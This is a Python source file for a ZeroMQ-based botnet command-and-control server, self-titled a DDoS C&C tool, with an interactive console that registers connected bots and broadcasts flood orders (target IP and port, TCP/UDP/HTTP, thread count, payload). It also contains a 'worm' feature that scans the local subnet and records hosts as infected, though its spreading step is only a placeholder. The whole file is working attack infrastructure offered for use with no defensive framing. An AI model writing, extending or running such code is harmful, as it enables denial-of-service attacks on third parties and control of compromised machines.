import zmq
import json
import shlex
import threading
import time
import signal
import sys
import binascii
import random
import ipaddress
import socket
import os
import subprocess

PORT = 5000
MONITOR_PORT = 5001


connected_bots = {}
bots_lock = threading.Lock()
server_running = True


worm_active = False
worm_threads = []
worm_lock = threading.Lock()
infected_ips = set()
scanning_range = "192.168.1.0/24"

def signal_handler(sig, frame):
    """Ctrl+C 핸들러"""
    global server_running
    print("\n[*] Shutting down the server...")
    server_running = False
    sys.exit(0)

def identity_to_str(identity):
    """Identity를 안전하게 문자열로 변환"""
    if isinstance(identity, bytes):
        try:
            return identity.decode('utf-8')
        except UnicodeDecodeError:
            try:
                return identity.decode('latin-1')
            except UnicodeDecodeError:
                return binascii.hexlify(identity).decode('ascii')
    return str(identity)

def get_my_ip():
    """현재 서버의 IP 주소 반환"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "127.0.0.1"

def get_network_range():
    """로컬 네트워크 범위 반환"""
    my_ip = get_my_ip()
    if my_ip.startswith('192.168.'):
        return f"{'.'.join(my_ip.split('.')[:3])}.0/24"
    elif my_ip.startswith('10.'):
        return f"{'.'.join(my_ip.split('.')[:2])}.0.0/16"
    elif my_ip.startswith('172.16.'):
        return f"{'.'.join(my_ip.split('.')[:2])}.0.0/12"
    else:
        return "192.168.1.0/24"

def scan_network_for_hosts():
    """로컬 네트워크에서 호스트 스캔"""
    global infected_ips, scanning_range
    
    my_ip = get_my_ip()
    try:
        network = ipaddress.ip_network(scanning_range, strict=False)
    except:
        network = ipaddress.ip_network("192.168.1.0/24", strict=False)
    
    potential_hosts = []
    
    for ip in network.hosts():
        ip_str = str(ip)
        if ip_str == my_ip or ip_str in infected_ips:
            continue
        potential_hosts.append(ip_str)
        if len(potential_hosts) >= 50:
            break
    
    return potential_hosts

def check_port_open(ip, port=5000, timeout=0.5):
    """특정 포트가 열려있는지 확인"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False

def worm_propagation():
    """웜 전파 기능"""
    global worm_active, infected_ips
    
    my_ip = get_my_ip()
    print(f"[WORM] Starting propagation from {my_ip}")
    
    if getattr(sys, 'frozen', False):
        current_file = os.path.abspath(sys.argv[0])
    else:
        current_file = os.path.abspath(__file__)
    
    potential_targets = scan_network_for_hosts()
    
    for target_ip in potential_targets:
        if not worm_active:
            break
            
        if check_port_open(target_ip, 5000):
            print(f"[WORM] Found active instance at {target_ip}:5000")
            continue
            
        try:
            print(f"[WORM] Attempting to propagate to {target_ip}")
            time.sleep(1)
            
            with worm_lock:
                infected_ips.add(target_ip)
            
            print(f"[WORM] Successfully spread to {target_ip}")
            
        except Exception as e:
            print(f"[WORM] Failed to spread to {target_ip}: {e}")
    
    print(f"[WORM] Propagation complete. Infected hosts: {len(infected_ips)}")

def worm_controller():
    """웜 메인 컨트롤러"""
    global worm_active
    
    print("[WORM] Worm controller started")
    
    while worm_active:
        try:
            worm_propagation()
            
            interval = random.randint(30, 60)
            print(f"[WORM] Next propagation in {interval} seconds")
            
            for _ in range(interval):
                if not worm_active:
                    break
                time.sleep(1)
                
        except Exception as e:
            print(f"[WORM] Controller error: {e}")
            time.sleep(10)

def start_worm():
    """웜 시작"""
    global worm_active, worm_threads, scanning_range
    
    if worm_active:
        print("[WORM] Already active")
        return
    
    scanning_range = get_network_range()
    print(f"[WORM] Scanning range: {scanning_range}")
    
    worm_active = True
    worm_thread = threading.Thread(target=worm_controller, daemon=True)
    worm_thread.start()
    worm_threads.append(worm_thread)
    
    print("[WORM] Worm started successfully")

def stop_worm():
    """웜 중지"""
    global worm_active, worm_threads
    
    if not worm_active:
        print("[WORM] Not active")
        return
    
    worm_active = False
    
    for t in worm_threads:
        t.join(timeout=2)
    worm_threads.clear()
    
    print(f"[WORM] Worm stopped. Total infected hosts: {len(infected_ips)}")

def bot_monitor_worker(context):
    """Background thread to handle client ping signals and manage list"""
    global server_running
    
    monitor_socket = context.socket(zmq.ROUTER)
    monitor_socket.bind(f"tcp://*:{MONITOR_PORT}")
    monitor_socket.setsockopt(zmq.RCVTIMEO, 1000)
    
    print(f"[*] Monitor socket listening on port {MONITOR_PORT}")
    
    while server_running:
        try:
            parts = monitor_socket.recv_multipart()
            
            if len(parts) == 3:
                identity, empty, message = parts
            elif len(parts) == 2:
                identity, message = parts
            else:
                print(f"[!] Unexpected message format: {len(parts)} parts")
                continue
            
            identity_str = identity_to_str(identity)
            
            try:
                msg_str = message.decode('utf-8')
            except UnicodeDecodeError:
                try:
                    msg_str = message.decode('latin-1')
                except UnicodeDecodeError:
                    continue
            
            if msg_str.startswith("PING"):
                try:
                    _, client_ip = msg_str.split(":", 1)
                except ValueError:
                    continue
                
                with bots_lock:
                    if identity_str not in connected_bots:
                        print(f"\n[+] New client connected from {client_ip}")
                        print("flood > ", end="", flush=True)
                    connected_bots[identity_str] = (client_ip, time.time())
                    
        except zmq.Again:
            continue
        except Exception as e:
            if server_running:
                print(f"[!] Monitor error: {e}")
            time.sleep(0.5)
            
    monitor_socket.close()
    print("[*] Monitor thread stopped")

def clean_disconnected_bots():
    """Background thread to clean up inactive clients"""
    global server_running
    
    while server_running:
        time.sleep(10)
        current_time = time.time()
        
        with bots_lock:
            to_remove = []
            for identity, (ip, last_seen) in list(connected_bots.items()):
                if current_time - last_seen > 30:
                    to_remove.append((identity, ip))
            
            for identity, ip in to_remove:
                del connected_bots[identity]
                print(f"\n[-] Client disconnected: {ip}")
                print("flood > ", end="", flush=True)

def get_bot_stats():
    """봇 통계 정보 반환"""
    with bots_lock:
        total = len(connected_bots)
        unique_ips = set(ip for ip, _ in connected_bots.values())
        return total, unique_ips

def main():
    global server_running
    
    signal.signal(signal.SIGINT, signal_handler)
    
    context = zmq.Context()
    
    server_socket = context.socket(zmq.PUB)
    server_socket.bind(f"tcp://*:{PORT}")
    server_socket.setsockopt(zmq.SNDHWM, 1000)

    print("=" * 50)
    print("FloodTOOLS : DDoS Command & Control Server")
    print(f"[*] Command port: {PORT}")
    print(f"[*] Monitor port: {MONITOR_PORT}")
    print("[*] Type 'help' for available commands")
    print("=" * 50)

    monitor_thread = threading.Thread(target=bot_monitor_worker, args=(context,))
    monitor_thread.daemon = True
    monitor_thread.start()

    clean_thread = threading.Thread(target=clean_disconnected_bots)
    clean_thread.daemon = True
    clean_thread.start()

    try:
        while server_running:
            try:
                user_input = input("flood > ").strip()
            except EOFError:
                break
                
            if not user_input:
                continue

            # 도움말
            if user_input.lower() == "help":
                print("\nAvailable Commands:")
                print("  flood <IP:PORT> <Protocol> <Threads> [payload]  - Start attack")
                print("  stop                                           - Stop all attacks")
                print("  bots                                           - Show connected bots")
                print("  status                                         - Show server status")
                print("  worm start                                     - Start worm propagation")
                print("  worm stop                                      - Stop worm propagation")
                print("  worm status                                    - Show worm status")
                print("  clear                                          - Clear screen")
                print("  help                                           - Show this help")
                print("  exit/quit                                      - Exit server\n")
                continue

            # 화면 지우기
            if user_input.lower() == "clear":
                import os
                os.system('cls' if os.name == 'nt' else 'clear')
                continue

            # 서버 상태
            if user_input.lower() == "status":
                total, unique_ips = get_bot_stats()
                print(f"\n[*] Server Status:")
                print(f"[-] Total bots: {total}")
                print(f"[-] Unique IPs: {len(unique_ips)}")
                print(f"[-] Running: {server_running}")
                print(f"[-] Worm Active: {worm_active}")
                print(f"[-] Infected hosts: {len(infected_ips)}\n")
                continue

            # STOP command
            if user_input.lower() == "stop":
                stop_signal = {"cmd": "STOP"}
                try:
                    server_socket.send_string(json.dumps(stop_signal))
                    print("[*] Stop signal sent to all clients.\n")
                except Exception as e:
                    print(f"[!] Failed to send stop signal: {e}")
                continue

            # WORM 명령어 처리 (worm start, worm stop, worm status)
            if user_input.lower().startswith("worm "):
                parts = user_input.lower().split()
                if len(parts) < 2:
                    print("[!] Usage: worm <start|stop|status>")
                    continue
                
                worm_cmd = parts[1]
                
                if worm_cmd == "start":
                    print("\n[*] Starting worm propagation...")
                    start_worm()
                    print()
                elif worm_cmd == "stop":
                    print("\n[*] Stopping worm...")
                    stop_worm()
                    print()
                elif worm_cmd == "status":
                    print(f"\n[*] Worm Status:")
                    print(f"[-] Active: {worm_active}")
                    print(f"[-] Infected hosts: {len(infected_ips)}")
                    print(f"[-] Scanning range: {scanning_range}")
                    if infected_ips:
                        print(f"[-] Infected IPs: {', '.join(list(infected_ips)[:10])}")
                        if len(infected_ips) > 10:
                            print(f"[-] ... and {len(infected_ips) - 10} more")
                    print()
                else:
                    print(f"[!] Unknown worm command: {worm_cmd}")
                    print("[!] Usage: worm <start|stop|status>")
                continue

            # Bots list
            if user_input.lower() == "bots":
                with bots_lock:
                    print(f"\n[*] Total Connected Clients: {len(connected_bots)}")
                    if connected_bots:
                        print("--- Connected IP List ---")
                        ip_groups = {}
                        for identity, (ip, last_seen) in connected_bots.items():
                            if ip not in ip_groups:
                                ip_groups[ip] = []
                            ip_groups[ip].append(identity)
                        
                        for i, (ip, identities) in enumerate(sorted(ip_groups.items()), 1):
                            print(f"[{i}] {ip} ({len(identities)} connections)")
                        print("-------------------------")
                    else:
                        print("[*] No active clients connected.")
                print()
                continue

            # 종료 명령어
            if user_input.lower() in ["exit", "quit"]:
                print("[*] Shutting down...")
                break

            # Parse user input for attack command
            try:
                args = shlex.split(user_input)
            except ValueError as e:
                print(f"[!] Input format error: {e}")
                print("[!] Form : flood <IP:PORT> <Protocol> <Count Thread> [payload]")
                continue

            if len(args) < 1:
                continue
                
            if args[0] != "flood":
                print("[!] Unknown command. Type 'help' for available commands.")
                continue
                
            if len(args) < 4:
                print("[!] Error: Insufficient arguments")
                print("[!] Form : flood <IP:PORT> <Protocol> <Count Thread> [payload]")
                print("[!] Example: flood 192.168.1.1:80 TCP 100")
                continue

            # Map arguments
            target = args[1]
            protocol = args[2].upper()
            thread_count = args[3]
            payload = args[4] if len(args) > 4 else "LOIC_ZMQ_DEFAULT_BURST_DATA"

            # Parse IP and Port
            if ":" in target:
                ip, port_str = target.split(":", 1)
                try:
                    port = int(port_str)
                    if not (1 <= port <= 65535):
                        raise ValueError("Port out of range")
                except ValueError as e:
                    print(f"[!] Invalid port: {e}")
                    continue
            else:
                print("[!] Port number must be specified. (Format: IP:PORT)")
                continue

            # Validate thread count
            try:
                threads_num = int(thread_count)
                if threads_num <= 0 or threads_num > 1000:
                    print("[!] Thread count must be between 1 and 1000")
                    continue
            except ValueError:
                print("[!] Thread count must be a number.")
                continue

            # Validate protocol
            if protocol not in ["TCP", "UDP", "HTTP"]:
                print("[!] Unsupported protocol. (Choose from TCP, UDP, HTTP)")
                continue

            # Validate payload size
            if len(payload) > 1024:
                print("[!] Payload too long (max 1024 characters)")
                continue

            # Package configuration
            config = {
                "cmd": "START",
                "target_ip": ip,
                "target_port": port,
                "protocol": protocol,
                "thread_count": threads_num,
                "payload": payload
            }

            # Broadcast configuration
            try:
                server_socket.send_string(json.dumps(config))
                print(f"[*] Attack command sent -> {ip}:{port} | Protocol: {protocol} | Threads: {threads_num}")
                if len(payload) > 50:
                    print(f"[-] Payload: {payload[:50]}...")
                else:
                    print(f"[-] Payload: {payload}")
                print("[*] Type 'stop' to halt attack\n")
            except Exception as e:
                print(f"[!] Failed to send command: {e}")

    except KeyboardInterrupt:
        print("\n[*] Shutting down the server.")
    finally:
        server_running = False
        stop_worm()
        server_socket.close()
        context.term()
        print("[*] Server terminated.")

if __name__ == "__main__":
    main()